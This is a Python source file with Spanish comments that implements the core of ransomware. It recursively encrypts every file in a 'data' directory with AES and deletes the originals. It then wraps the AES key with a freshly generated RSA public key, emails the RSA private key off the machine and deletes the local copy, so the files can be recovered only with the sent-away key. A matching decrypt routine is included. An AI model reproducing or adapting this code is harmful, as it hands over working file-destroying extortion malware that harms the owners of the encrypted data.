from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.backends import default_backend
import os
import logging
from pathlib import Path
from src.email_utils import send_private_key_email  # Importar función de envío de email

# Configuración de logging
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# Definir rutas de archivos
KEY_PATH = Path("key/aes_key.key")  # Clave AES encriptada
PRIVATE_KEY_PATH = Path("key/private_key.pem")
DIRECTORY_TO_ENCRYPT = Path("data")
    
# Generar clave RSA y clave AES
def generate_rsa_key_pair():
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048
    )
    public_key = private_key.public_key()
    save_private_key(private_key)
    return public_key  # Solo devolver la clave pública para encriptar la clave AES

def save_private_key(private_key):
    PRIVATE_KEY_PATH.parent.mkdir(parents=True, exist_ok=True)
    with open(PRIVATE_KEY_PATH, 'wb') as priv_file:
        priv_file.write(private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption()
        ))

# Encriptar clave AES con clave pública
def encrypt_aes_key(aes_key, public_key):
    encrypted_key = public_key.encrypt(
        aes_key,
        padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
    )
    with open(KEY_PATH, 'wb') as key_file:
        key_file.write(encrypted_key)

# Encriptar todos los archivos en el directorio y enviar la clave privada
def encrypt_directory(directory_path, recipient_email):
    aes_key = os.urandom(32)  # Generar clave AES
    public_key = generate_rsa_key_pair()  # Generar par de claves RSA
    encrypt_aes_key(aes_key, public_key)  # Encriptar la clave AES con la clave pública

    # Encriptar todos los archivos
    for file_path in directory_path.rglob('*'):
        if file_path.is_file() and not file_path.suffix.endswith('.enc'):
            logging.info(f"Procesando archivo para encriptar: {file_path}")
            encrypt_file(file_path, aes_key)

    # Enviar clave privada por correo y eliminarla
    send_private_key_email(recipient_email, PRIVATE_KEY_PATH)
    os.remove(PRIVATE_KEY_PATH)  # Eliminar la clave privada del sistema
    logging.info("Clave privada eliminada del sistema después de enviarla por correo.")

# Encriptar un archivo con AES
def encrypt_file(file_path, aes_key):
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    with open(file_path, 'rb') as f:
        plaintext = f.read()

    ciphertext = encryptor.update(plaintext) + encryptor.finalize()
    encrypted_file_path = file_path.with_suffix(file_path.suffix + '.enc')
    with open(encrypted_file_path, 'wb') as f:
        f.write(iv + ciphertext)

    file_path.unlink()  # Eliminar el archivo original
    logging.info(f"Archivo {file_path} encriptado exitosamente.")

# Desencriptar todos los archivos en el directorio
def decrypt_directory(directory_path, private_key_text):
    # Convertir el texto de la clave privada en un objeto de clave privada
    private_key = serialization.load_pem_private_key(
        private_key_text.encode('utf-8'),
        password=None,
        backend=default_backend()
    )

    with open(KEY_PATH, 'rb') as key_file:
        encrypted_aes_key = key_file.read()

    # Desencriptar la clave AES con la clave privada
    aes_key = decrypt_aes_key_with_private_key(encrypted_aes_key, private_key)

    for file_path in directory_path.rglob('*.enc'):
        logging.info(f"Procesando archivo para desencriptar: {file_path}")
        decrypt_file(file_path, aes_key)

# Desencriptar clave AES con clave privada
def decrypt_aes_key_with_private_key(encrypted_aes_key, private_key):
    aes_key = private_key.decrypt(
        encrypted_aes_key,
        padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
    )
    return aes_key

# Desencriptar un archivo
def decrypt_file(file_path, aes_key):
    with open(file_path, 'rb') as f:
        iv = f.read(16)
        ciphertext = f.read()

    cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    plaintext = decryptor.update(ciphertext) + decryptor.finalize()

    decrypted_file_path = file_path.with_suffix('')
    with open(decrypted_file_path, 'wb') as f:
        f.write(plaintext)

    file_path.unlink()  # Eliminar el archivo encriptado
    logging.info(f"Archivo {file_path} desencriptado exitosamente.")
